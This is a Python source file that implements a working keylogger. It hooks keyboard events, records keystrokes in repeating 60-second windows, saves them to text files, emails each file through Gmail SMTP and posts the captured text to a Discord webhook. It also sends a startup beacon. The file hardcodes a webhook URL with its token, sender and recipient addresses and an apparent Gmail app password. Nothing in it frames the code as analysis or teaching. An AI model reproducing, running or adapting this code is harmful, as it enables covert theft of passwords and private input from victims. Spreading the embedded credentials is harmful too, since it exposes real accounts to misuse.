import time
import threading
import keyboard
import smtplib
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

MaruWare = 'https://discord.com/api/webhooks/1053177518368247899/1xTfyhE27YzyhGYTyzNHpndGJKIRoKTLI9H2rJKgJy9uzLE2-w0Jz_FdsuHmKyJS-yZQ'

def Send_D_Rock(message):
    data = {
        'content': message
    }
    response = requests.post(MaruWare, json=data)
    if response.status_code == 204:
        print('Message sent to Discord successfully.')
    else:
        print('Failed to send message to Discord.')

def Maru_Clock():
    global timer_active
    timer_active = True
    time.sleep(60)
    timer_active = False

def maru_Rec(key):
    global recorded_text
    if timer_active:
        if key.name == "shift":
            return  
        elif key.name in ["alt", "ctrl", "windows", "tab", "caps lock"] or key.name.startswith("f"):
            recorded_text += " {" + key.name + "} "
        elif key.name == "space":
            recorded_text += " "  
        elif key.name == "backspace":
            recorded_text = recorded_text[:-1]  
        else:
            if keyboard.is_pressed("shift"):
                recorded_text += key.name.upper()
            else:
                recorded_text += key.name

keyboard.on_release(maru_Rec)

def send_email(output_file):
    Hiraku = "hirakushiro@gmail.com"  
    Maru = "tgfmike@gmail.com"   
    subject = "Recorded Text File"

    msg = MIMEMultipart()
    msg["From"] = Hiraku
    msg["To"] = Maru
    msg["Subject"] = subject

    with open(output_file, "rb") as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header("content-disposition", f"attachment; filename= {output_file}")
        msg.attach(attachment)

    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = Hiraku
    Local_list = "rxrwrkoybhldkmgc"  

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, Local_list)
        server.sendmail(Hiraku, Maru, msg.as_string())
        server.quit()
        print("Email sent successfully.")
        
        
        Send_D_Rock(recorded_text)  
    except Exception as e:
        print("An error occurred while sending the email:", e)
        Send_D_Rock(f"Error sending email: {e}")

startup_message = 'PC has started up!'
Send_D_Rock(startup_message)

while True:
    recorded_text = ""
    timer_active = False
    
    print("Type within the next 60 seconds to record.")

    timer_thread = threading.Thread(target=Maru_Clock)
    timer_thread.start()

    while timer_thread.is_alive():
        time.sleep(1)

    current_time = time.strftime("%Y-%m-%d_%H-%M-%S")
    output_file = f"output_{current_time}.txt"
    with open(output_file, "w") as file:
        file.write(recorded_text)

    print(f"Recorded text saved to file: {output_file}")

    send_email(output_file)
